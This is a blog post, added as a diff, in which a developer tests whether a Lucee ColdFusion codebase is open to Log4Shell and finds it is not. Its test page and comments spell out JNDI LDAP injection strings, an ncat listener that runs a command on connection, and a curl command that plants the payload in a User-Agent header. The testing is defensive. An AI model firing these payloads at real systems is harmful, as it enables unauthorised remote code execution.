@@ -1,0 +1,153 @@
+<!doctype html><html lang=en-us>
+<head>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge">
+<title> ColdFusion log4shell | Barrett Otte</title>
+<link rel=canonical href=https://barrettotte.github.com/posts/15/>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<link rel=stylesheet href=https://barrettotte.github.com/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N+XoIuZg==">
+<link rel=stylesheet href=/lib/font-awesome/css/all.min.css>
+<link rel=stylesheet href=https://barrettotte.github.com/css/custom.css>
+<link rel=preload href=/lib/font-awesome/webfonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin=anonymous>
+<link rel=preload href=/lib/font-awesome/webfonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin=anonymous>
+<link rel=preload href=/lib/font-awesome/webfonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin=anonymous>
+<link rel=preload href=/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2 as=font type=font/woff2 crossorigin=anonymous>
+<link rel=icon href=https://barrettotte.github.com/img/favicon.svg>
+</head>
+<body class="max-width mx-auto px3 py5 ltr">
+<div class="content index py4"><header id=header>
+<div id=title>
+<h1><a href=https://barrettotte.github.com>Barrett Otte</a></h1>
+<div id=subtitle>
+<div class=subtitle-item><a href=https://github.com/barrettotte>Software Engineer</a></div>
+<div class=subtitle-item>Tinkerer</div>
+<div class=subtitle-item><a href=https://anilist.co/user/barrettotte/>Loser</a></div>
+</div>
+</div>
+<div id=nav>
+<div class=nav-item>
+<a href=/>Home</a>
+</div>
+<div class=nav-item>
+<a href=/projects>Projects</a>
+</div>
+<div class=nav-item>
+<a class=active href=/posts>Posts</a>
+</div>
+<div class=nav-item>
+<a href=/about>About</a>
+</div>
+<div class=nav-item>
+<a href=https://raw.githubusercontent.com/barrettotte/Resume/master/barrettotte-resume.pdf>Resume</a>
+</div>
+<div class=nav-item>
+<a href=/misc>Misc</a>
+</div>
+</div>
+</header>
+<article class=post>
+<header>
+<h1 class=posttitle>ColdFusion log4shell</h1>
+<div class=meta>
+<span class=author>
+<span>Barrett Otte</span>
+</span>
+<div class=postdate>
+<time datetime="2021-12-13 00:00:00 +0000 UTC">2021-12-13</time>
+</div>
+<div class=article-read-time>
+<i class="far fa-clock"></i>
+1 minute read
+</div>
+</div>
+</header>
+<div class=content>
+<p>In light of the &ldquo;wonderful&rdquo; log4j exploit, I was tasked with exploring my company&rsquo;s ColdFusion
+codebase to see if it was exploitable. We are using a flavor of ColdFusion called Lucee.</p>
+<p>In summary, Lucee 5.3.4 was not vulnerable. This fact was also confirmed in this <a href=https://dev.lucee.org/t/lucee-is-not-affected-by-the-log4j-jndi-exploit-cve-2021-44228/9331>official Lucee post</a>.</p>
+<p>This page will provide a basic interface to test the exploit described in <a href=https://github.com/leonjza/log4jpwn>https://github.com/leonjza/log4jpwn</a>.
+See notes in bottom of source for initializing reverse shell.</p>
+<p><code>log4shell.cfm</code></p>
+<pre tabindex=0><code>&lt;html&gt;
+  &lt;body&gt;
+    &lt;h2&gt;log4shell test&lt;/h2&gt;
+    &lt;hr&gt;
+    &lt;div style=&quot;margin-bottom: 50px;&quot;&gt;
+        Setup attacker with &amp;nbsp;&lt;code&gt;ncat -k -vv -c &quot;calc.exe&quot; -l 18081&lt;/code&gt;
+        &lt;br&gt;
+        Try this: &amp;nbsp;&lt;code&gt;${jndi:ldap://192.168.10.123:18081/a}&lt;/code&gt;
+    &lt;/div&gt;
+    &lt;form action=&quot;./index.cfm&quot;&gt;
+        &lt;label for=&quot;logIt&quot;&gt;Enter string to log:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;logIt&quot; name=&quot;logIt&quot; required&gt;&lt;/input&gt;
+        &lt;input type=&quot;submit&quot; value=&quot;submit&quot;/&gt;
+    &lt;/form&gt;
+    &lt;cfscript&gt;
+      main();
+      private void function main(){
+        if (structKeyExists(url, 'logIt')) {
+            writeOutput('You entered: &lt;code&gt;#url.logIt#&lt;/code&gt;');
+            writeLog(file='log4shell', text='#url.logIt#', type='error'); // nothing
+            writeDump(var='#url.logIt#', output='console');               // nothing
+            systemOutput('#url.logIt#');                                  // nothing
+        }
+      }
+      /*  Other notes
+        Basic log4shell test to ensure my reverse shell was working right
+          - clone and build https://github.com/leonjza/log4jpwn
+          - ncat -k -vv -c &quot;calc.exe&quot; -l 8081
+          - docker run --rm -p8080:8080 log4jpwn
+          - curl -H 'User-Agent: ${jndi:ldap://192.168.10.123:18081/a}' localhost:8081
+          - This opens calculator on target system
+        Setup this testing page in lucee (5.3.4) at /log4shell.cfm
+          - ncat -k -vv -c &quot;calc.exe&quot; -l 18081
+          - https://myserver:8482/log4shell.cfm?logIt=%24%7Bjndi%3Aldap%3A%2F%2F192.168.10.123%3A18081%2Fa%7D
+          - entered value '${jndi:ldap://192.168.10.123:18081/a}' into form and submitted
+          - Lucee seems to be safe
+        
+        Also read: https://dev.lucee.org/t/lucee-is-not-affected-by-the-log4j-jndi-exploit-cve-2021-44228/9331
+      */
+    &lt;/cfscript&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>A gist for this code is available <a href=https://gist.github.com/barrettotte/01ef8db67b30af49533f83552b5d0450>here</a>.</p>
+</div>
+</article>
+<footer id=footer>
+<div class=footer-left>
+&copy; 2022
+<a href=/>Barrett Otte</a>
+</div>
+<div class=footer-right>
+<nav>
+<ul>
+<li>
+<a class=icon target=_blank rel=noopener href=mailto:barrettotte@gmail.com>
+<i class="fas fa-lg fa-envelope"></i>
+</a>
+</li>
+<li>
+<a class=icon target=_blank rel=noopener href=https://github.com/barrettotte>
+<i class="fab fa-lg fa-github"></i>
+</a>
+</li>
+<li>
+<a class=icon target=_blank rel=noopener href=https://www.linkedin.com/in/barrettotte/>
+<i class="fab fa-lg fa-linkedin"></i>
+</a>
+</li>
+<li>
+<a class=icon target=_blank rel=noopener href="https://news.ycombinator.com/user?id=barrettotte">
+<i class="fab fa-lg fa-hacker-news-square"></i>
+</a>
+</li>
+</ul>
+</nav>
+</div>
+</footer>
+</div>
+</body>
+<link rel=stylesheet href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/code-copy.js></script>
+</html>
